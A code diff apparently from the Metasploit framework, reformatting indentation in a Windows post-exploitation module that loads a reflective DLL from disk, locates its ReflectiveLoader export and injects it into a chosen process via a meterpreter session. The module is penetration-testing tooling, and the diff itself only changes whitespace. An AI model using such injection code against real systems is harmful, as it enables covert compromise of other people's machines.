@@ -12,15 +12,15 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-			'Name'          => 'Windows Manage Reflective DLL Injection Module',
-			'Description'   => %q{
+			'Name'		=> 'Windows Manage Reflective DLL Injection Module',
+			'Description'	=> %q{
 				This module will inject into the memory of a process a specified Reflective DLL.
 			},
-			'License'       => MSF_LICENSE,
-			'Author'        => [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
-			'Platform'      => [ 'win' ],
-			'SessionTypes'  => [ 'meterpreter' ],
-			'References'    => [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ]
+			'License'	=> MSF_LICENSE,
+			'Author'	=> [ 'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'],
+			'Platform'	=> [ 'win' ],
+			'SessionTypes'	=> [ 'meterpreter' ],
+			'References'	=> [ [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ] ]
 		))
 
 		register_options(
@@ -37,23 +37,23 @@ class Metasploit3 < Msf::Post
 
 		dll = ''
 		offset = nil
-                begin
-                        File.open( datastore['PATH'], "rb" ) { |f| dll += f.read(f.stat.size) }
+		begin
+			File.open( datastore['PATH'], "rb" ) { |f| dll += f.read(f.stat.size) }
 
-                        pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
+			pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
 
-                        pe.exports.entries.each do |entry|
-                                if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
-                                        offset = pe.rva_to_file_offset( entry.rva )
-                                        break
-                                end
-                        end
+			pe.exports.entries.each do |entry|
+				if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
+					offset = pe.rva_to_file_offset( entry.rva )
+					break
+				end
+			end
 
-                        raise "Can't find an exported ReflectiveLoader function!" if offset == 0
-                rescue
-                        print_error( "Failed to read and parse Dll file: #{$!}" )
-                        return
-                end
+			raise "Can't find an exported ReflectiveLoader function!" if offset == 0
+		rescue
+			print_error( "Failed to read and parse Dll file: #{$!}" )
+			return
+		end
 
 		inject_into_pid(dll, datastore['PID'], offset)
 	end
@@ -74,7 +74,7 @@ class Metasploit3 < Msf::Post
 			print_error("Invalid PID.")
 			return
 		end
-		
+
 		print_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
 		begin
 			print_status("Opening process #{pid}")
